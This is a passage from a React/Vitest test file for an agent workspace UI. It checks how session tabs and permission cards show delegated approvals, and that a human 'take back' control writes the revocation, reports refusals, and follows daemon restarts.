    // And nothing here names the A2A task state: the roster never carries one.
    expect(pills.map((pill) => pill.textContent)).not.toContain("input_required");
  });

  it("leaves a parked session's reason to the attention pill", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...acpSession("human-1", "my agent"),
        attention: { reason: "permission", atMs: 1_760_000_000_000 },
      },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });

    const tab = await vi.waitFor(() => {
      const found = container.querySelector<HTMLElement>("#workspace-session-tab-human-1");
      if (found === null) throw new Error("human session's tab did not render");
      return found;
    });

    const pills = [...tab.querySelectorAll<HTMLElement>(".workspace-session-origin-badge")].map(
      (pill) => pill.textContent,
    );
    expect(pills.some((text) => text?.startsWith("created by"))).toBe(false);
    expect(pills).not.toContain("input_required");
    // The one roster-level fact behind a parked card is the attention the daemon
    // raises, and this is the pill that names it — the words a person reads.
    expect(tab.querySelector(".workspace-tab-attention")?.textContent).toBe("needs approval");
  });

  it("names the peer device on the permission card's provenance line", async () => {
    const peerAgent: Session = {
      ...acpSession("peer-agent", "remote agent"),
      origin: { kind: "peer", deviceId: "device-phone", role: "client" },
    };
    vi.mocked(sessionsList).mockResolvedValue([peerAgent]);
    const devicesRead = deferred<DevicesReply>();
    vi.mocked(devicesList).mockReturnValue(devicesRead.promise);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await vi.waitFor(() => {
      expect(container.querySelector(".workspace-session-tab")).not.toBeNull();
      expect(devicesList).toHaveBeenCalledTimes(1);
    });
    await act(async () => {
      devicesRead.resolve(devicesReply);
    });

    const emit = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emit === null) throw new Error("permission emitter did not render");
    await act(async () => emit.click());

    const provenance = container.querySelector(".permission-card-origin");
    expect(provenance?.textContent).toBe("Device: Xiaomi 14 · Role: client");
    // The card must never fall back to the raw device id.
    expect(provenance?.textContent).not.toContain("device-phone");
  });
});

describe("delegation on the roster", () => {
  let container: HTMLDivElement;
  let root: ReturnType<typeof createRoot>;

  /** Pushes a roster through the same channel the app watches. */
  async function pushRoster(snapshots: SessionStateSnapshot[]) {
    const listener = vi.mocked(createSessionStateChannel).mock.calls[0]?.[0] as
      | ((snapshots: SessionStateSnapshot[]) => void)
      | undefined;
    await act(async () => listener?.(snapshots));
  }

  // The ledger arm in isolation: the marker arm (unattended: "yes") is pinned
  // separately in workspaceSessions.test.ts, so this fixture no longer carries
  // both and can no longer hide which one produced the pill.
  const unattendedChild: SessionStateSnapshot = {
    id: "child-unattended",
    workspaceId: "workspace-1",
    kind: "acp",
    title: "night worker",
    state: { type: "live", generation: 1 },
    elapsedMs: 0,
    createdBy: "session-1",
    displayName: "night worker",
    delegation: { answered: 2, state: "unattended" },
  };

  const activeChild: SessionStateSnapshot = {
    id: "child-active",
    workspaceId: "workspace-1",
    kind: "acp",
    title: "day worker",
    state: { type: "live", generation: 1 },
    elapsedMs: 0,
    createdBy: "session-1",
    displayName: "day worker",
    delegation: { answered: 0, state: "active" },
  };

  function enabledController() {
    return createDelegationController({
      get: vi.fn(async () => ({ enabled: true, source: "file" as const })),
      set: vi.fn(async () => undefined),
    });
  }

  beforeEach(() => {
    container = document.createElement("div");
    document.body.appendChild(container);
    vi.mocked(createSessionStateChannel).mockClear();
    // The take-back is capability-gated like every delegation RPC, so this
    // describe's daemon advertises it.
    vi.mocked(daemonStatus).mockResolvedValue({
      ...daemonConnected,
      capabilities: [...daemonConnected.capabilities, "permission_delegation"],
    });
  });

  afterEach(async () => {
    await act(async () => root.unmount());
    container.remove();
  });

  it("keeps the loud pill after the switch turns off, takes the write on the active row, and drops only the take-back", async () => {
    // The take-back lives on the ACTIVE row only: on an unattended row the
    // click could not do what the button promises (the child keeps its born
    // ability), so the control is not offered there at all.
    const set = vi.fn(async () => undefined);
    const delegation = createDelegationController({
      get: vi.fn(async () => ({ enabled: true, source: "file" as const })),
      set,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace delegation={delegation} />);
    });
    await act(async () => undefined);

    await pushRoster([unattendedChild, activeChild]);
    await act(async () => undefined);

    const loud = container.querySelector(".workspace-tab-delegation-unattended");
    expect(loud).not.toBeNull();
    expect(loud?.textContent).toBe("runs unattended \u00b7 created in an auto-accepting profile");
    // The take-back sits beside the row it can act on, and its accessible
    // name declares the global scope.
    const takeBack = container.querySelector<HTMLButtonElement>(".workspace-tab-takeback");
    expect(takeBack).not.toBeNull();
    expect(takeBack?.getAttribute("aria-label")).toBe(
      "Take back \u2014 stops every agent from answering for its children",
    );
    // ...and on the unattended row there is none, even with the switch on
    // (the take-back renders as the tab's next sibling when it exists).
    const unattendedTab = Array.from(container.querySelectorAll(".workspace-session-tab")).find(
      (tab) => tab.textContent?.includes("night worker"),
    );
    expect(unattendedTab?.nextElementSibling?.classList.contains("workspace-tab-takeback")).toBe(
      false,
    );

    // The human takes the power back from the active row.
    if (takeBack === null) throw new Error("take-back did not render");
    await act(async () => takeBack.click());
    await act(async () => undefined);

    // The take-back is a WRITE: the injected controller's set must have been
    // asked for `false` — not merely mirrored optimistically in the store.
    expect(set).toHaveBeenCalledWith(false);
    expect(delegation.getState().enabled).toBe(false);
    // The pill is a fact of the child's birth: it does NOT disappear or
    // change because the live switch did. Deriving it from the setting is
    // the named red mutation.
    const loudAfter = container.querySelector(".workspace-tab-delegation-unattended");
    expect(loudAfter).not.toBeNull();
    expect(loudAfter?.textContent).toBe(
      "runs unattended \u00b7 created in an auto-accepting profile",
    );
    // A control that cannot act is gone.
    expect(container.querySelector(".workspace-tab-takeback")).toBeNull();
    // And it closed nothing: the child's row is still in the strip.
    const strip = Array.from(container.querySelectorAll(".workspace-session-tab")).find((tab) =>
      tab.textContent?.includes("night worker"),
    );
    expect(strip).not.toBeUndefined();
  });

  it("reports a refused take-back on the roster surface, where the click happened", async () => {
    // Audit 3 F4: the refusal's sentence existed only on the Settings tab —
    // the roster's button vanished and came back with no word on the surface
    // the human clicked. The re-read the refusal schedules is held back so
    // the sentence's standing time is under the test's hand.
    const get = vi
      .fn()
      .mockResolvedValueOnce({ enabled: true, source: "file" })
      .mockImplementation(() => new Promise(() => undefined));
    const delegation = createDelegationController({
      get,
      set: vi.fn(async () => {
        throw new Error("the store refused the take-back");
      }),
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace delegation={delegation} />);
    });
    await act(async () => undefined);
    await pushRoster([activeChild]);
    await act(async () => undefined);

    const takeBack = container.querySelector<HTMLButtonElement>(".workspace-tab-takeback");
    if (takeBack === null) throw new Error("take-back did not render");
    await act(async () => takeBack.click());
    await act(async () => undefined);

    const alerts = Array.from(container.querySelectorAll('[role="alert"]')).map(
      (element) => element.textContent ?? "",
    );
    expect(alerts.some((text) => text.includes("the store refused the take-back"))).toBe(true);
  });

  it("offers the take-back while the delegation answer is unknown, and the click still writes", async () => {
    // Audit 3 F2 with F5: the control that stops delegation must not be
    // gated on the panel's belief — a failed read leaves the app knowing
    // nothing, and that is exactly when a human may need to act. The write
    // needs no stored answer: `false` can only reduce what the daemon
    // exercises (see `setEnabled` in `lib/delegation.ts`).
    const set = vi.fn(async () => undefined);
    const delegation = createDelegationController({
      get: vi.fn(async () => {
        throw new Error("the daemon is unreachable");
      }),
      set,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace delegation={delegation} />);
    });
    await act(async () => undefined);
    await pushRoster([activeChild]);
    await act(async () => undefined);

    // Unknown is not off: the control stands on the active row.
    const takeBack = container.querySelector<HTMLButtonElement>(".workspace-tab-takeback");
    expect(takeBack).not.toBeNull();
    if (takeBack === null) throw new Error("take-back did not render");
    await act(async () => takeBack.click());
    await act(async () => undefined);
    expect(set).toHaveBeenCalledWith(false);
    expect(delegation.getState().enabled).toBe(false);
    // The daemon took the take-back: the store now holds a definite off, and
    // the control leaves with the belief it no longer needs to correct.
    expect(container.querySelector(".workspace-tab-takeback")).toBeNull();
  });

  it("re-reads the switch when the daemon restarts, and the take-back follows the fresh answer", async () => {
    // Audit 3 F2: nothing re-read the setting after the first load, so a
    // daemon restart that reloads `delegation.json` left the roster's belief
    // stale forever — here the restart is even invisible to the poll (no
    // disconnected gap): only the instance id changes. The controller must
    // re-ask, and the row's control must follow the fresh answer.
    vi.useFakeTimers();
    try {
      const statusFor = (instanceId: string): DaemonStatus => ({
        state: "connected",
        pid: 42,
        instanceId,
        protocolVersion: 1,
        clients: 1,
        capabilities: [...daemonConnected.capabilities, "permission_delegation"],
        message: null,
      });
      const answers: DaemonStatus[] = [statusFor("daemon-a"), statusFor("daemon-b")];
      vi.mocked(daemonStatus).mockImplementation(() => {
        const next = answers.shift();
        return Promise.resolve(next ?? statusFor("daemon-b"));
      });
      const get = vi
        .fn()
        .mockResolvedValueOnce({ enabled: false, source: "file" })
        .mockResolvedValueOnce({ enabled: true, source: "file" });
      const delegation = createDelegationController({ get, set: vi.fn(async () => undefined) });
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace delegation={delegation} />);
      });
      await act(async () => undefined);
      await pushRoster([activeChild]);
      await act(async () => undefined);

      // The first daemon holds off: no take-back, honestly.
      expect(get).toHaveBeenCalledTimes(1);
      expect(container.querySelector(".workspace-tab-takeback")).toBeNull();

      // The restart: a new instance, same capabilities, no gap observed.
      await act(async () => {
        vi.advanceTimersByTime(2_000);
      });
      await act(async () => undefined);

      // The roster re-asked its new daemon — which holds ON, a human having
      // flipped delegation.json while the old one was down — and the control
      // that answers it is back.
      expect(get).toHaveBeenCalledTimes(2);
      expect(container.querySelector(".workspace-tab-takeback")).not.toBeNull();
    } finally {
      vi.useRealTimers();
    }
  });

  it("renders no delegation pill and no take-back on a human-started session", async () => {
    const delegation = enabledController();
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace delegation={delegation} />);
    });
    await act(async () => undefined);
    await pushRoster([
      {
        id: "session-1",
        workspaceId: "workspace-1",
        kind: "terminal",
        title: "shell one",
        state: { type: "live", generation: 1 },
        elapsedMs: 0,
      },
    ]);
    await act(async () => undefined);

    expect(container.querySelector(".workspace-tab-delegation")).toBeNull();
    expect(container.querySelector(".workspace-tab-takeback")).toBeNull();
  });

  it("renders the quiet answering pill with the answered count from the push", async () => {
    const delegation = enabledController();
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace delegation={delegation} />);
    });
    await act(async () => undefined);
    await pushRoster([
      {
        ...unattendedChild,
        id: "child-active",
        displayName: "day worker",
        delegation: { answered: 3, state: "active" },
        unattended: "no",
      },
    ]);
    await act(async () => undefined);

    const pill = container.querySelector(".workspace-tab-delegation-active");
    expect(pill?.textContent).toBe("answers to its creator \u00b7 answered \u00d73");
  });

  it("shows a creator-answered card resolving with its attribution instead of vanishing", async () => {
    vi.mocked(sessionsList).mockResolvedValue([]);
    // The child is created through the add flow; the daemon stamps its
    // creator on it, so the mock's created session carries the same
    // `createdBy` the emitted `answeredBy` will claim.
    vi.mocked(sessionCreate).mockResolvedValue({
      ...acpSession("session-created", "agent two"),
      createdBy: "s.creator.1",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emit = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emit === null) throw new Error("permission emitter did not render");
    await act(async () => emit.click());
    expect(container.querySelector(".permission-card")).not.toBeNull();

    const creatorResolved = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-resolved-creator-denied]",
    );
    if (creatorResolved === null) throw new Error("creator resolution emitter did not render");
    await act(async () => creatorResolved.click());

    // Rendered output, not the event: the card stays, carrying who answered
    // and what they chose.
    const card = container.querySelector(".permission-card");
    expect(card).not.toBeNull();
    expect(card?.querySelector(".permission-card-label")?.textContent).toBe(
      "Denied by its creator \u2014 the turn continues without it",
    );
  });

  it("carries an allowed creator answer with the same honesty", async () => {
    vi.mocked(sessionsList).mockResolvedValue([]);
    vi.mocked(sessionCreate).mockResolvedValue({
      ...acpSession("session-created", "agent two"),
      createdBy: "s.creator.1",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emit = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emit === null) throw new Error("permission emitter did not render");
    await act(async () => emit.click());

    const creatorResolved = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-resolved-creator-allowed]",
    );
    if (creatorResolved === null) throw new Error("creator resolution emitter did not render");
    await act(async () => creatorResolved.click());

    const card = container.querySelector(".permission-card");
    expect(card).not.toBeNull();
    expect(card?.querySelector(".permission-card-label")?.textContent).toBe(
      "Allowed by its creator \u00b7 running",
    );
  });

  it("renders allow_always as ALLOWED by its creator — never as a denial", async () => {
    // The daemon's auto-accept path prefers allow_once and falls back to
    // allow_always, so a delegated answer is exactly where allow_always
    // arrives; the old two-way branch rendered it, and an absent kind, as
    // "Denied by its creator".
    vi.mocked(sessionCreate).mockResolvedValue({
      ...acpSession("session-created", "agent two"),
      createdBy: "s.creator.1",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emit = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emit === null) throw new Error("permission emitter did not render");
    await act(async () => emit.click());

    const allowAlways = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-resolved-creator-allow-always]",
    );
    if (allowAlways === null) throw new Error("allow-always emitter did not render");
    await act(async () => allowAlways.click());

    const card = container.querySelector(".permission-card");
    expect(card).not.toBeNull();
    const label = card?.querySelector(".permission-card-label")?.textContent ?? "";
    expect(label).toBe("Allowed by its creator \u00b7 running");
    expect(label).not.toContain("Denied");
  });

  it("keeps a fully unnamed resolution on screen as its own state instead of deleting the card", async () => {
    // answeredBy null (the daemon said nobody): the old path deleted the card
    // as if a person had answered it. Silence is not a person.
    vi.mocked(sessionCreate).mockResolvedValue({
      ...acpSession("session-created", "agent two"),
      createdBy: "s.creator.1",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emit = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emit === null) throw new Error("permission emitter did not render");
    await act(async () => emit.click());

    const silent = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-resolved-silent]",
    );
    if (silent === null) throw new Error("silent resolution emitter did not render");
    await act(async () => silent.click());

    const card = container.querySelector(".permission-card");
    expect(card).not.toBeNull();
    expect(card?.querySelector(".permission-card-label")?.textContent).toBe(
      "Answered \u2014 by whom and with what outcome, the daemon did not say",
    );
  });

  it("clears a resolved card: the queue does not fill with answered cards that cannot leave", async () => {
    vi.mocked(sessionCreate).mockResolvedValue({
      ...acpSession("session-created", "agent two"),
      createdBy: "s.creator.1",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emit = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emit === null) throw new Error("permission emitter did not render");
    await act(async () => emit.click());

    const creatorResolved = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-resolved-creator-denied]",
    );
    if (creatorResolved === null) throw new Error("creator resolution emitter did not render");
    await act(async () => creatorResolved.click());
    expect(container.querySelector(".permission-card")).not.toBeNull();

    const clear = container.querySelector<HTMLButtonElement>(".permission-card-dismiss-action");
    if (clear === null) throw new Error("clear control did not render");
    await act(async () => clear.click());

    // The one removal a resolved card offers, and after it the queue holds
    // nothing for this session.
    expect(container.querySelector(".permission-card")).toBeNull();
  });
});
